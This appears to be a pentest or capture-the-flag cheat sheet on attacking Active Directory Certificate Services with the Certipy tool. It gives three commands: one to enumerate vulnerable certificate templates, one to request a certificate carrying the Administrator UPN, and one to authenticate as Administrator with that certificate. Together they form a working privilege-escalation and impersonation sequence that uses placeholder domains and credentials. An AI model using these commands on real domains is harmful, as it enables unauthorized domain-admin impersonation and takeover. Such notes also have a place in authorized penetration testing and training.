# ADCS

## Certipy

Enumerate Certificate Authority configurations to find vulnerable settings:

```bash
certipy-ad find -u amogus@{DOMAIN} -p password -vulnerable -stdout -debug
```

Requesting a certificate with certipy:

```bash
certipy-ad req -k -no-pass -ca amgs-DC-CA -upn Administrator -target {DOMAIN}
```

Impersonating account with certificate:

```bash
certipy-ad auth -pfx admin.pfx -username Administrator -domain {DOMAIN}
```
